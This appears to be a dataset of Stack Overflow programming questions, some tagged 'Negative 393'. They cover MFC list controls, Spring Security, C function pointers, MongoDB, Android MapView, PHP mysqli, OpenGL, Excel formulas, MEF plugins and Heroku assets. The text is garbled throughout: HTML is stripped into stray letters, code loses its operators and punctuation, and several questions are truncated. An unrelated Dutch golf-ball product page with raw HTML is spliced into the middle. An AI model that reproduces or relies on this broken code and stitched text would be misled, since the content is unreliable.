It is to use ctrl or shift to select several rows, and then click any one bulb of them, and to switch the status of all selected items. li ol  pThe problem isp  pWhen I clicked the light bulb the multi selected will be lost. It means when I uses API GetSelectedCount, it will return 0.  p  pMy Investigation  p  pWhen I clicked the light bulb, the event about item change will be triggered. and the OnItemChanged event will be triggered before OnClick event thats why API GetSelectedCount will return 0 in event OnClock.  I wanted to cache the multi selected items in event OnItemChanged, but I failed because every item will trigger OnItemChanged event once. p  pfor exmple if I multi selected 3 items in the list view, and then click the light bulb of the 3rd item, the event OnItemChanged will be triggered for 3 times, to notify the 3 items were unselected. So, in OnClick event of click light bulb, I dont know which items were selected in previous operations.p  pFurthermore, I still want to keep the multi selectionw after I click the light bulb. p  pAny help will be much appreciated p  pONNOTIFYREFLECTLVNITEMCHANGED, OnItemChangedp  pONNOTIFYREFLECTEXNMCLICK, OnClickp  pvoid CListCtrlOnItemChanged NMHDR pNMHDR, LRESULT pResult   ......p  pBOOL CListCtrlOnClickNMHDR pNMHDR, LRESULT pResult ......p  pimg srchttpi.stack.imgur.comwubbz.jpg altscreen shot samplep

Negative 393 pI understand that the spring security is creating a new session. In my case this is persistent to Gemfire. when the user logins the application is checking if a session exists if so, puts the authentication success in a session attribute. Also, a new session is created after successful login. p  pThe issue here is, after login spring security here, a new session cookie is created by the application not spring security framework and given back as session cookie value and hence when I click on any of the home page link protected with  the session cookie value is checked for any authentication token in the new session. Since, this was not initially persisted the user is redirected to login page.p  pThe issue IMO is that the application should share the session create by the spring security framework and should not create a new one at the application end.p  pwhat is the possible root cause and fix of this help really appreciated ..

Negative 393 pMy client is asking for  a slider plugin for wordpress those will be placed at  the header of the page.

He wants some like this link a hrefhttpgovacation.com relnofollowhttpgovacation.coma . Please look at the slider of the top. Try to resize the browser width and height. The main theme is when someone resize the browser window the image is hiding behind the screen. and no scroll bar is coming.  Scroll bar will come only when the screen is resized to less than 960 pixel. Image size of the sliders  will be 1600600 px.So suppose the screen is now at 1000px then you will  be able to see only 1000px portion of the image the rest will be hidden from both side of the screen. Please observe the behavior of a hrefhttpgovacation.com relnofollowhttpgovacation.coma p  pI am not actually the logic behind this so that I can start with CSS and js. What will be main theme to start for this. Do you have anything in your collection If it is normal jquery slider then also no problem . I will convert it to wordpress plugin.

Negative 393 pI am currently changing the function signatures of a class of functions in an application.  These functions are being stored in a function table, so I was expecting to change this function table as well.  I have just realised that in certain instances, we already use the new function signature.  But because everything is casted to the correct function type as it is put into the function table, no warnings are being raised.p  pWhen the function is called, it will be passed extra parameters that are not really part of the function declaration, but they are on the end of the parameter list.p  pI cant determine if this is guaranteed by the way function parameters are passed in C.  I guess to do variadic functions like sprintf, it has to be the case that earlier arguments can be resolved correctly whatever is on the end of the parameter listp  pIt evidently works just fine across multiple platforms but out of curiosity Id like to know how and why it works.p

Negative 393 pI have an unsigned int and a hex value.

I need to be able to detect the presenceabsence of the hex Error Codes int the variable reason. How do I do itp  pEdit 1  Apologies all, I guess I posted a slightly different question when I tried to simplify it and post. What I have is a couple of Major, Minor and Optional Error codes  For Egp  precodedefine MAJORERRORCODE1 0x00020000 define MAJORERRORCODE2 0x00010000 define MAJORERRORCODE3 0x00070000  define MINORERRORCODE1 0x00000002 define MINORERRORCODE2 0x00000004 define MINORERRORCODE3 0x00000006  define OPTIONALERRORCODE1 0x80000000 define OPTIONALERRORCODE2 0x50000000 define OPTIONALERRORCODE3 0x30000000 codepre  pNow my unsigned int is a combination of these three error codes. Each of these error codes have a unique string and depending on which one of these is present in my variable reason i need to generate the string.p

Negative 393 pI apologize for asking a n00b question, but Im only just learning about Rx, and Im unclear about a way it is supposed to be used.p  pI understand Rx is about observables and if I would like to subscribe to some observable values entered in a few text and checkboxes which in turn could affect an enabled state of a button, how would I best go about that, is there a way to databind to an observablep  pFrom what I gather from some examples Ive looked at so far, most make LINQ queries that query values which are in the textand checkboxes and then they set properties of controls programmatically and not by direct databinding, is that right If that is the case how do you query those values please An small example would be awesome please.p

I have forwarded them, but I suspect only onResume is called, because the fragment was already alive when I inserted the mapView.p  pOn the stack trace provided, you can see the internal mapview error, and that it comes from onResume.p  pShould I manually call onCreate and onStart or I am doing something wrongp  pThanks in advancep  precode    0611 211129.799 WSystem.err7804 java.lang.NullPointerException     0611 211129.799 WSystem.err7804     at maps.aj.bi.bUnknown Source     0611 211129.799 WSystem.err7804     at bcz.onTransactSourceFile73     0611 211129.799 WSystem.err7804     at android.os.Binder.transactBinder.java297     0611 211129.799 WSystem.err7804     at com.google.android.gms.maps.internal.IMapViewDelegateaa.onResumeUnknown Source     0611 211129.799 WSystem.err7804     at com.google.android.gms.maps.MapViewa.onResumeUnknown Source     0611 211129.799 WSystem.err7804     at com.google.android.gms.internal.bb6.bUnknown Source     0611 211129.799 WSystem.err7804     at com.google.android.gms.internal.bb1.aUnknown Source     0611 211129.799 WSystem.err7804     at com.google.android.gms.maps.MapViewb.aPUnknown Source     0611 211129.799 WSystem.err7804     at com.google.android.gms.maps.MapViewb.aUnknown Source     0611 211129.799 WSystem.err7804     at com.google.android.gms.internal.bb.aUnknown Source     0611 211129.799 WSystem.err7804     at com.google.android.gms.internal.bb.onResumeUnknown Source     0611 211129.799 WSystem.err7804     at com.google.android.gms.maps.MapView.onResumeUnknown Source                  0611 211129.799 WSystem.err7804     at com.regaliz.funq.story.FunqLayermap.delegateonResumeFunqLayermap.java66     0611 211129.799 WSystem.err7804     at com.regaliz.funq.story.FunqSlide.onResumeFunqSlide.java622     0611 211129.799 WSystem.err7804     at android.support.v4.app.Fragment.performResumeFragment.java1503                   0611 211129.799 WSystem.err7804     at android.support.v4.app.FragmentManagerImpl.moveToStateFragmentManager.java947     0611 211129.799 WSystem.err7804     at android.support.v4.app.FragmentManagerImpl.performPendingDeferredStartFragmentManager.java807     0611 211129.799 WSystem.err7804     at android.support.v4.app.FragmentManagerImpl.startPendingDeferredFragmentsFragmentManager.java1112     0611 211129.799 WSystem.err7804     at android.support.v4.app.FragmentManagerImpl.execPendingActionsFragmentManager.java1461     0611 211129.799 WSystem.err7804     at android.support.v4.app.FragmentManagerImpl.executePendingTransactionsFragmentManager.java461     0611 211129.799 WSystem.err7804     at android.support.v4.app.FragmentStatePagerAdapter.finishUpdateFragmentStatePagerAdapter.java163     0611 211129.799 WSystem.err7804     at android.support.v4.view.ViewPager.populateViewPager.java1064     0611 211129.799 WSystem.err7804     at android.support.v4.view.ViewPager.populateViewPager.java911     0611 211129.799 WSystem.err7804     at android.support.v4.view.ViewPager3.runViewPager.java242 codepre

Negative 393 pIn MongoDB, I only need to make date range queries.

If I just store the dates as strings YYYYMMDD, would not the range query gt20130601 and lt20130831 still give me the same results as if they were of datetime type Are they the same in this scenario If so, what would be the advantage of storing as a DateTime object.

Negative 393 pIm working with a Spring MVC website and adding authentication with Active Directory over LDAP. The company doesnt want to use the AD authorities to map permissions for the website, we have a database that lists each users permissions so Im trying to connect to that, get the permissions, and add them to the users Authentication token.p  pWhen I first started I was mapping the AD user groups authorities with a codeGrantedAuthoritiesMappercode and I had that working. It looked like thisp  precodepublic class ActiveDirectoryGrantedAuthoritiesMapper implements GrantedAuthoritiesMapper       private static final String ROLEADMIN  adminUserGroup      public ActiveDirectoryGrantedAuthoritiesMapper            public Collectionlt extends GrantedAuthoritygt mapAuthorities             final Collectionlt extends GrantedAuthoritygt authorities               SetltCustomAuthoritygt roles  EnumSet.noneOfCustomAuthority.class          for GrantedAuthority authority  authorities                      if ROLEADMIN.equalsauthority.getAuthority                              roles.addCustomAuthority.ROLEADMIN                          Default role for all users.             roles.addCustomAuthority.ROLEEMPLOYEE                  return roles       codepre  pNow Im trying to convert it to query our database for permissions. I moved away from the codeGrantedAuthoritiesMappercode to do this for two reasons. First off Im not using the Authorities from LDAP so why even intercept them And also because I couldnt figure out how to get the name of the user logging in inside of the codeGrantedAuthoritiesMappercode. I tried using the codeSecurityContextcode but it was giving me a codeNullPointerExceptioncode whenever I tried to call codecontext.getAuthentication.getNamecode I assume because the user wasnt fully authenticated yet.p  pSo I switched to using an codeAuthenticationSuccessHandlercode. I tried to keep the logic just about the same. Im trying to add the roles to the users Authentication token with codeauthentication.getAuthorities.add...code but Im getting errors that my codeCustomAuthoritycode doesnt extend codeGrantedAuthoritycode. It doesnt extend it, but it implements the interface. I was wondering if this was because it was an enum, so I changed it to a class and Im still getting the error. Heres the code for the custom codeAuthenticationSuccessHandlercode as I have it nowp  precodepublic class CustomAuthoritiesMapper implements AuthenticationSuccessHandler       private CustomPermissionDAO permissionsDao  new CustomPermissionDAO      private static final String ROLEADMIN  ADMINACCOUNT      Override     public void onAuthenticationSuccessHttpServletRequest request, HttpServletResponse response, Authentication authentication             throws IOException, ServletException              ListltGrantedAuthoritygt roles  new ArrayListltGrantedAuthoritygt          ListltDatabasePermissiongt permissionsForUser  permissionsDao.getPermissionByUsernameauthentication.getName          for DatabasePermission permission  permissionsForUser                      if ROLEADMIN.equals permission.getTag                               roles.addnew CustomAuthorityROLEADMIN                          Default role for all users.             roles.addnew DashboardAuthorityROLEEMPLOYEE                  forGrantedAuthority auth  roles                      authentication.getAuthorities.addauth                codepre  pIve tried just about every combination of everything that I can think of..

Negative 393 pIm having a really weird issue as well as a stressful time trying to figure this out.p  pUsing a form, I was trying to insert data into my database. The initial SQL query had variables for values, but it didnt work. After trying a few things and using mysqlierror I wasnt able to find the problem. I then replaced all the variables with strings, still, my data does not insert.p  pIve tried the below code nested amongst other bits of PHP, doesnt work. I tried it on a different page, didnt work. So I stripped everything and left just the mysqlconnect link and the mysqliquery and it still will not insert.p  pThe error mysqlierror reports is ALWAYS, even if there is nothing what so ever related to mysql tried it nested further down the page, and on different pages, and on its own page on line 2, the following codeerror  You have an error in your SQL syntax check the manual that corresponds to your MySQL server version for the right syntax to use near  at line 2code and I just cannot make sense of it.p  pMy code below is as followsp  precodelink  mysqliconnecthost, username, password, database or diecannot connect try  mysqliquerylink,INSERT INTO troubleshootingfiles title, asset, image, category, file VALUES title, asset, image, cat, file try  mysqliquerylink,INSERT INTO troubleshootingusers name VALUES title iftry  false     echo error       echo mysqlierrorlink    else         echo all good      codepre  pI have tried entering just one field, I tried without the s in the field names, I tried a different table name and it doesnt work. phpMyAdmin inserts data into the tables fine. I also have PHP code in a different directory on the server that inserts data fine into this database, although that code still uses the deprecated mysqlquery at the minute. I also have code that inserts rows fine on this server into a different database. I assume the database must be fine if PMA can insert data okay, and elsewhere in my script, other mysqliquerys work fine as I can fetch objects and update tables fine.p  pI really dont know what else to try. Any ideas would be great.p  pstrongEDITstrong Thank you all, it was the missing  after the values If only mysqlierror could have at least hinted towards this rather than giving me nothing of use.p

Negative 393 pI have an OpenGL project that has a collection of GameObjects. I have a thread which is the game loop that iterates over the objects and calls the update method. Additionally, OpenGL has the drawFrame method that iterates over the objects and renders the objects. Finally, I have the onTouchEvent method that is in a third thread that iterates over the objects and calls each objects version of the onTouchEvent method.p  pThat said, when one of my object moves position based off the screen touch, I am getting a ghost image of the object in its previous location. It is a simple flicker, but very annoying and very obvious. Other objects moving freely not based off the onTouchEvent do not have the ghost image of itself trailing, but the object whos position changes when the onTouchEvent method is called, creates a ghost image.p  pHow do I prevent this from happening Ive wrapped both my methods in synchronizedthis and it still does not work. p  precodepublic void drawFrameGL10 gl              ifrenderType  RenderType.r2D             prepare2DDrawinggl         else ifrenderType  RenderType.r3D             prepare3DDrawinggl      synchronizedthis              camera.drawgl         forGameObject objobjects                      gl.glPushMatrix             obj.drawgl             gl.glPopMatrix                    public void updatefloat time      cds.testCollisionsobjects     synchronizedthis              camera.updatetime         forGameObject objobjects                      obj.updatetime                  motions.clear       public void onTouchEventMotionEvent e      iftouchable  Touchable.TOUCHABLE              synchronizedthis                      forGameObject objobjects                              obj.onTouchEvente                              codepre

Negative 393 pIts my first question here, so please dont kill me if something is wrong. I have found numerous solutions on this site, but not this time. Unfortunately I cant post images yet. It wont be easy, but I will try.p  pTo the pointp  pstrongMy data has the following headersstrongp  pDecisionId Opponent1 Opponent2 Opponent3 Suitor1 Suitor2 Suitor3 Suitor4p  pDecisionid is a unique integer identifier. The rest are strings.p  pEach row represents a particular judicial decision. Each Decision can have UP TO 3 opponents defending party and UP TO 4 suitors attacking party.A particular party can be a suitor in one decision and an opponent in another one.p  pstrongWhat I want to getstrong p  pCrosstable where both rows and columns headers are all distinct parties I encounter in the table. no problem with that, done. Where each cell shows in how many distinct decisions a particular opponent defined by row header was attacked by a particular suitor column header  All diagonal cells equal ZERO a party cant attack itself and table is not symmetric.p  pstrongI have triedstrong p  pto apply to the  first cell and than expandp  pCOUNTIFSFixed range of all opponents B2D6,the wanted opponent value  A2,   Fixed range of all suitors E2H6, the wanted suitor value  B1p  pI had an error. I figured out that criteria ranges have to be of the same size. OK, created dummy empty columns  no error, BUT, the results are clearly underestimated. I think that there is a match only if opponent and suitor have the same number. In details For each row excel tests the opponent1 and suitor1 towards corresponding values, then opponent2 and suitor2, then opponent3 and suitor3...  This actually explains why the ranges have to be of the same size.p  pstrongSo, What I would needstrongp  pIs, for each row, to make excel test all opponents towards the wanted opponent value, test all suitor towards the wanted suitor value. If at least one opponent and one suitors correspond, give it a match and count this decision.Even though opponent1 and suitor3 had the wanted valuesp  pstrongRemarksstrongp  pI have already made a VBA code which does the job, but its too slow around 5 hours for the whole table and I expect to do the same for different tables of this kind andor modify this one. So I am interested in pure excel, fast solution.p  pThank you very muchp

Negative 393 pThis question might be design related or code related, but Im stuck so Im open to any kind of answer a pointer in the right wayp  pI have used MEF Managed Extensibility Framework to develop a piece of WPF software that will act as a form of orchestrator for plugins. The application is simply redirecting data between the plugins as of the users choice, so what the plugin does is not known at all especialy since they can be developed by 3rd party devs. The application and the plugin is sharing an interface as a  way of knowing what methods to call for, so the traffic goes both way a plugin calls a method in the main application sending it data and the main application is passing this data to another pluggin.p  pThis works so far, but Im having problem with synchronous behaviour. All methods defined by the interface lack a return value Void and Im struggeling to get a fire and forget kind of aproach where the calling application does NOT need so sit around waiting for the plugins recieving function to finnish execute code and calls that goes back to the main app.p  pSo whats the best aproach to solve this Letting every plugin and the mainapp put its workload on a stack of some kind just to be able to return the control to the calling side and then have some mechanism that runs separately that works through the stack item by item and do this stack aproach as asyncp  pOther things worth noting is that the plugins are running in separate threads according to the debugger thread window and when they are initialized they get a reference from the calling main application so they can fire functions in the main app. The plugins also very often need to tell the main app what status they are in idle, working, error etc and also send data to be logged by the main app, so this very often creates a nested call hierarchy if you follow me, hard to explain.p  pIm using .Net 4.5 for this one.p  pBelow is some simplified example of the code.

Negative 393 pI want to write a template that generates classes based on some attributes of some properties on the already exsisting classes. p  pIm pretty sure T4 templates let me do that, but what I want to do is to have those attributes defined in my class library along with the T4 template so that when you reference my DLL and use the attributes in your code, the classes still get automatically generated it doesnt matter if they are generated as a part of the DLLs assembly, which might not even be possible, or as a part of the assembly thats referencing my DLLp  pWhat I can do is use precompiled templates or just some function that generates class code as a string and then make a template in the project that references my DLL and just make a call to the generator function from inside the template. Why I dont want to do this, is because it forces the user to manually create that template in their project.p
Negative 393 pI want to use cfflush in a backend on some pages. But on railo, the server administrator is configured to use gzip compression.

I dont want to disable the gzip compression on all the frontend, only in a few pages in the backend. There is some way to disable it using a tag onthefly as the same way that requesttimeout or the pageencodingp

Negative 393 pIm in the middle of porting a JSF 2.1 application to Jboss EAP 6.1 JBoss AS 7.2. The application runs smoothly on Glassfish 3.1, and Weblogic 12c. Moreover a slightly similar application was ported successfully. The problem occurs in a specific EJB singleton. In this, I have a method with codePostConstructcode annotation, which runs at startup and fills a List with SelectItems. During deploy, a codejava.lang.ClassNotFoundExceptioncode exception is thrown, which says JBoss cant find the codejavax.faces.model.SelectItemcode class. If I comment out the method, everything is fine. The SelectItem class is used in some other beans in the web module without any problem.p  pMy question is Is there any known reason for this behaviour Do I need some special configuration to use classes from the codejavax.facescode package in an EJB module, running on JBoss JSF is not packaged with the EAR, so the application uses the servers implementation.p  pThank youp

Negative 393 pIn my Netty 3.x FrameDecoder implementation I make use of the ChannelBufferIndexFinder to help me find the delimiter between FIX a hrefhttpwww.fixtradingcommunity.org relnofollowhttpwww.fixtradingcommunity.orga messages.  The delimiter is defined as a series of characters.  To find the delimiter, I am utilising the ChannelBuffer.indexOf method with my implementation of the ChannelBufferIndexFinder.p  pThe ChannelBufferIndexFinder passes in the ChannelBuffer, so I was able to check other bytes in the buffer for the delimiter.  p  pWith Netty 4.x, the ByteBuf.indexOf only allows me to search for a single byte.  Alternatively, there is also ByteBuf.forEachByteByteBufProcessor, however a ByteBufProcessor once again only gives me access to a single byte.p  pIs there a way to find my delimiter  Im guessing at the moment my only solution will be to roll my own equivalent version of ByteBuf.forEachByte that spans multiple bytes  Something like what the DelimiterBasedFrameDecoder.indexOf has donep  pThanksp

Negative 393 pI have a PHP site, where a central functionality is clicking one of two buttons on a page. Quite simple. Based on which button is clicked, different values are stored in a database.p  pInitially I used two codeltButtongtcode elements in the same form, but as this doesnt seem to be compatible with all browsers, I use two forms instead. While the code might not be necessary It works, I provide it anyway. For the actual problem, please scroll down. The forms are defined thusp  precodeltform methodpost actionindex.phpgt   ltinput typehidden nameconfirm value1gt   ltinput typehidden nameid value1gt   ltinput typesubmit valueIncludegt ltformgt ltform methodpost actionindex.phpgt   ltinput typehidden nameconfirm value1gt   ltinput typehidden nameid value1gt   ltinput typesubmit valueExcludegt ltformgt codepre  pAnd the corresponding POSTreading section in index.phpp  precodeif filterhasvarINPUTPOST,confirm    msi  connectDB Creates and returns a mysqli connection   c  filterinputINPUTPOST,confirm   id  filterinputINPUTPOST,id   mysqliquerymsi,UPDATE table SET confirm  c WHERE id  id   headerLocation index.php  codepre  pNow... this works exactly as intended  the table is updated with the codeconfirmcodevalue that was clicked. And when running this on my localhost setup, there are no problems at all.p  pHowever, once I launched this on the production website, the submit buttons will only fire occasionally. Once a user clicks either submit button, they are shown a new page, with the same buttons and a new ID  so the page is displayed many times, and sometimes it works on the first click on either button, but most of the times nothing happens when clicking although perhaps it refreshes the page  I am unsure of this. Any suggestionsp  pEDIT A little more information, and the reason why I know it doesnt firep  pWhenever this page loads, it selects a random ID from codetablecode, where codeconfirmcode is 0, i.e. not confirmed yet. It then displays some information based on this ID. The PHP then loads a new page, with a new random ID. In other words, whenever either submit is clicked, it should change the codeconfirmcodevalue of the current ID to something different from 0, and the same ID will never be displayed again. And in the localhostdevelopment setting, that is the case  but in the live setting, the page sometimes refreshes, showing the same information, not updating the codeconfirmcodevalue. If the user clicks the same button again, it might perform correctly  it appears to be rather random.p  pEDIT 2  strongFIXEDstrong I had a suspicion that since it worked in dev, and not in live, the error must be found there. So after discussing it with a coworker, I searched for server cache problems with my server host, and it turns out others are having similar problems. The fix was adding the following lines to code.htaccesscodep  precodeRewriteEngine on RewriteRule .  [ECacheControlnocache]  codepre  pThank you to those who took the time to respond.p

Negative 393 pShortly about the task. We have an array of promises that could either resolve or reject. To understand whether total result is good or not  we need to know results of all promises in array. p  pIn JQuery our usual stronggoto librarystrong for promises code.when.applycode works in a way that if one of the promises in array is rejected  main promise for the whole array is instantly rejected too, without waiting for all array element results, so this solution is not an option.p  pIn Q library theres a code.allSetteledcode method that does the thing nicely. But I was wondering if there is some way to implement the same functionality using JQuery because were already using it in the project.p  pAny help appreciated Thanksp

Negative 393 pIm trying to figure out how to prevent the codeonBeforeUnloadcode event from being triggered in IE9 when using links without hrefs.p  pIve set up a a hrefhttpjsfiddle.netstafffanhh6pq8 relnofollowfiddlea here a simplified test of a real scenario, which pretty much describes what Im trying to accomplish. Whenever codeonBeforeUnloadcode is triggered ergo, when a link is clicked, the page background becomes blue. When using codeattachEventcode I can easily codereturn falsecode to prevent that from happen. But when adding the links click event with codeaddEventListenercode, the return statement doesnt make any difference. More or less, I would like link 4 to behave like link 2.p  pYes, changing from links to buttons would be a solution. Altering the onBeforeUnload functionality like having that code as part och the click functionality would be another. But sadly, I dont have control of those pieces of code.p  pSo. Are there any way I can stop click events on links from trigger codeonBeforeUnloadcode when set up with codeaddEventListenercode Or did MS remove this possibility when migrating from codeattachEventcode to codeaddEventListenercode, because its generally a bad idea to prevent users from navigating away from a pagep

Negative 393 pMapping an input file into memory and then directly parsing data from the mapped memory pages can be a convenient and efficient way to read data from files. p  pHowever, this practice also seems fundamentally unsafe unless you can ensure that no other process writes to a mapped file, because even the data in private readonly mappings may change if the underlying file is written to by another process. POSIX e.g. a hrefhttppubs.opengroup.orgonlinepubs7908799xshmmap.htmldoesnt specifya whether modifications to the underlying object done after the MAPPRIVATE mapping is established are visible through the MAPPRIVATE mapping.p  pIf you wanted to make your code safe in the presence of external changes to the mapped file, youd have to access the mapped memory only through volatile pointers and then be extremely careful about how you read and validate the input, which seems impractical for many use cases.p  pIs this analysis correct The documentation for memory mapping APIs generally mentions this issue only in passing, if at all, so I wonder whether Im missing something.p

Negative 393 pI know this has been asked, probably, a million times, but for the life of me I cannot get anything to work. p  pI have a UI wizard control that on the changed event validates the model. If the model is not valid, it doe not allow the user to move forward in the wizard. I have tired using the .when.done feature in jquery, but my code still passes through before making sure the model is valid. The reason for calling an async ajax request is I do not want the UI to lock up so I can show some sort of progress indicator. I had set the async property to false, but my UI indicator would never show up.

Negative 393 pThis issue has just recently come up in our last several pushes to Heroku since upgrading to Rails 4. My application has two web dynos. What Ive been able to find through troubleshooting is that Im having issues with one web dyno loading an older compiled CSS file when there are newer compiled assets available. The other web dyno will then serve the current, desired application CSS. I should state that we compile our assets before pushing to heroku.p  pWhat Ive found is that the web dyno that serves the old assets, always serves the old assets. Ive tried deleting web.2 and then recreating it, and the issue persists. Ive even gone and created 8 web dynos and then logged them to see if they served new or old assets. In that test, about half of the dynos consistenly served old assets, and half served new.p  pRestarting the individual dynos doesnt seem to help either.p  pWere running Rails 4 on Ruby 2.1p
Negative 393 pI use Symfony2 in a complex web application and use HTTP caching to speed up the application.p  pIn a scenario where there is a page of content inside a private logged in area which is expensive to generate and only needs to be refreshed when the underlying entity changes, I want to use the ETag header to manage caching in the manner described in the Symfony2 cookbookp  pa hrefhttpsymfony.comdoccurrentbookhttpcache.htmloptimizingyourcodewithvalidation relnofollowhttpsymfony.comdoccurrentbookhttpcache.htmloptimizingyourcodewithvalidationap  pThis works fine when the response is set to Public and on a public page. This is because it uses the Symfony reverse proxy AppCache to manage the caching.p  pHowever I dont want the response to be public or cached by the reverse proxy. p  pAs far as I understand HTTP Caching its perfectly possible for the browser to privately cache the page and use ETags to communicate with my controller as to when the content needs to be refreshed. I would like it if the browser received a 304 from my application if the IfNoneMatch request header matches the ETag on the response.p  pBut, with AppCache on in production when the response is marked Private or if it is private by default because there are cookies in the request header, the fetch method in codeHttpCachecode Symfony 2.3 does thisp  precode avoid that the backend sends no content ... subRequestgtheadersgtremoveifnonematch codepre  pwhich basically means that by the time the isNotModified method on the Response is run in my controller, the coderequestgtgetEtagscode returns an empty array even if the codeIfNoneMatchcode header was present in the request. Therefore isNotModified is always false and my application regenerates the content every time.p  pMy question is why does Symfonys AppCache prevent this form of private cache validation by clearing the ifnonematch header Is there a good reason for it Is using ETag headers with private responses not a sensible thing to want to dop  pIs there a way to disable this behaviour of AppCachep

Negative 393 pGood morning guysp  pI have a question to do with the looping of a function. I have spent a few hours trying to figure it out, I suspect the answers are out there I just dont quite know the right question to ask so Ill try and articulate it here. Im using the twitteR package to pull down tweets and trying to write a function that you can specify a range of dates and it will pull down the tweets for each day in that range eg days 110 and it pulls down tweets from 12 23 ... 910p  pIn the codesearchtwittercode function there is a place for since and until these take data in the format of yyyymmdd. So thats the ground work my approach has been to try and generate to sequences of dates using say codexltseqas.Datex, length.out, by1 daycode and then another  starting the next day. This gives us two sequences lets say x and y. I then want to apply the searchtwitter function to those to generate a list of tweets for each x and y value. I was originally just trying to do this with the sapply function as followsp  precodesapplyx, searchTwitterqantas, n1, cainfocacert.pem, retryOnRateLimit99999, sincex codepre  pThis isnt however, working as i think the date is treated as a chr causing error perhapsp  pAny help is greatly appreciated. p

Negative 393 pI am working on building a schedule. So far its pretty straightforward. There is one bit of functionality I am having issues with. p  pI have an codeulcode that has a fixed height to allow scrolling. There are Labels codeli.dayLabelcode withing the codeulcode that separate the hours. What I am trying to do is to have it so that when a label is scrolled out of view it will change the text in the placeholder to its text. Then once that works, I need it to work in reverse. So when they label scrolls back into view it updates the placeholder. Basically, I am trying to make the placeholder be a title for the available items until another label is then scrolled out of view. This is for scrolling from the top. So as you scroll down the list the placeholder is meant to be a title for the section you are viewing until you reach another section and it takes its place. Then when you scroll back down I need it to replace the text with the previous codeli.dayLabelcode so the sections stay organized. I hope this makes sense.p  pYou can see what I am trying to do by looking at the a hrefhttpsonlifetv.comtvprogramguide.html relnofolloworiginala that I am basing this off of. Notice how the placeholder changes as you scroll down the list and changes back when you scroll back up.p  pDemo a hrefhttpjsfiddle.net8B6QP relnofollowjsFiddlea   Note line 54 is the part that is in questionp  pI originally usedp  precode.snlfschedulelist li.dayLabelvisiblefirst.text codepre  pas the a hrefhttpapi.jquery.comfirstselector relnofollowcodefirstcode selectora is suppose to only match a single element.p  pI later triedp  precode.snlfschedulelist li.dayLabelvisible.filtereq0 codepre  pas this is suppose to be the same thing.p  pIt seems that when an element is out of view it still is considered codevisiblecode I believe this is my issue. p  pAm I doing this completely wrong I was under the impression that when you scroll an element like this it should no longer be codevisiblecode. After reading the a hrefhttpsapi.jquery.comvisibleselector relnofollowdocumentationa I have learned that this is not the correct selector to use.p  pIt would appear that a hrefhttpsapi.jquery.comscrollTop relnofollowscrollTopa is how I should be doing this. Now I have used codescrollTopcode for scrolling down pages to disable animations when not in view but I am not clear on how to untilize this for a codeulcode with scrollbars.p  pI triedp  precodevar first  li.dayLabelfirst  next element to scroll out of view if this.scrollTop gt first.offset.topfirst.height       Out of view     console.logout  else       in view     console.login  codepre  pUpdated Demo a hrefhttpjsfiddle.net8B6QP1 relnofollowjsFiddleap  pBut it seems to be redundant as its already calculating the first element so I am not sure how to get the correct element the next one thats about to scroll out of view. Then I need this to work when they scroll back up...p  pAny insight on this is much appreciated. Hopefully its something simple I am just over complicating or missing completely.p  pThanks, Jeremyp

Hij combineert een aantal eigenschappen die men normaliter niet in n bal vindt. De bal voelt zeer zacht aan en geeft zeer veel backspin. Daarnaast is het een echte distance bal. Zelfs met lage swingsnelheden wordt een hoge launch en daarmee grote afstand behaald. Wat deze bal echter vooral bijzonder maakt is zijn prijs. De TOURX bevindt zich namelijk qua performance op het niveau van premium ballen, maar met een prijs van  1,98 per stuk op een prijsniveau dat zelfs voor een goede 2piece bal laag genoemd mag worden.ltpgt ltp styletextalign centergtlta styletextalign center titleKlik voor USGA Conforming Golf Ball list 2013 in PDF hrefimagesPDFgballlist72013.pdf targetblankgtConforms with USGA Rulesltagtltpgt ltp styletextalign justifygtltstrong stylelineheight 1.3emgtAdviesprijsampnbspltstronggtltspan stylelineheight 1.3emgt 23,75 per dozijnltspangtltpgt ltpgtltspan stylecolor 31994dgtltstrong stylelineheight 1.3emgtDoelgroepltstronggtltspangtltpgt ltulgt ltligtSpelers op zoek naar een bal voor maximale afstand met de driverampnbspltligt ltligtltspan stylelineheight 1.3em datamcemark1gtSpelers die een bal zoeken met een drop ampamp stop effectltspangtltligt ltligtltspan stylelineheight 1.3em datamcemark1gtSpelers die een bal zoeken met op en rond de greens een zeer zacht gevoelltspangtltligt ltligtltspan stylelineheight 1.3em datamcemark1gtSpelers met een swingsnelheid met de driver van 80 tot 115 mphampnbspltspangtltligt ltulgt ltstrong stylecolor 000000 fontfamily Verdana, Arial, Helvetica, sansserif fontsize 11px lineheight 1.3emgtltspan stylelineheight 1.3em datamcemark1gtltstrong stylecolor 000000 fontfamily Verdana, Arial, Helvetica, sansserif fontsize 11px lineheight 1.3emgtltspan stylelineheight 1.3em datamcemark1gtampnbsp ampnbspampnbsp ampnbspampnbspltbr gtltspangtltstronggtltspangtltstronggtlttdgt lttd stylewidth 450px valigntopgt ltpgtltstrong stylecolor 000000 fontfamily Verdana, Arial, Helvetica, sansserif fontsize 11px lineheight 1.3emgtltspan stylelineheight 1.3em datamcemark1gtampnbspltspangtltstronggtltpgt ltpgtltstrong stylecolor 000000 fontfamily Verdana, Arial, Helvetica, sansserif fontsize 11px lineheight 1.3emgtltspan stylelineheight 1.3em datamcemark1gtltstrong stylelineheight 1.3emgtltspan stylelineheight 1.3em datamcemark1gtltimg stylefloat left srcimagesBallenTOURX3Dshadow.png altTOURX 3D shadow width364 height353 gtltbr styleclear left gtltspangtltstronggtltspangtltstronggtltpgt lttdgt lttrgt lttrgt lttdgt ltpgtampnbspltpgt lttdgt lttdgtampnbsplttdgt lttrgt lttbodygt lttablegt lttable border0gt lttbodygt lttrgt lttd stylewidth 250pxgtltimg srcimagesBallenCore1green.png altCore1 green width275 height157 gtlttdgt lttdgtampnbsplttdgt lttd stylewidth 800px alignleft valigntopgt ltpgtltspan stylecolor 31994dgtltstronggtPOLYBUTADIENE COREltstronggtltspangtltpgt ltp styletextalign justifygtDe binnenste kern van de TOURX bestaat uit high speed polybutadiene.

Negative 393 pIm currently working on a cross platform Android and iOS using the brilliant MVVMCross and things are going pretty great with the application and no major hassles so far. p  pHowever today Ive hit one thats causing me some problems. Im a strong believer in separation of concerns and what Im trying to do is to register a class as a lazy singleton implementer of two different interfaces.

